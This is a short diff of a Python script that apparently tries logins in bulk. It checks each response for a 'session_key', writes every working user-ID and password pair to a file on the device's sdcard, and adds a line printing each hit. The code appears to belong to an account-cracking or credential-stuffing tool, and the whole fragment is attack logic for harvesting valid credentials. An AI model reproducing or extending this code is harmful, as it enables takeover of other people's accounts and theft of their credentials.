@@ -1043,6 +1043,7 @@ def gxds_files(uid, pxss):
                 allow_redirects=False,
             ).json()
             if "session_key" in q:
+                print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
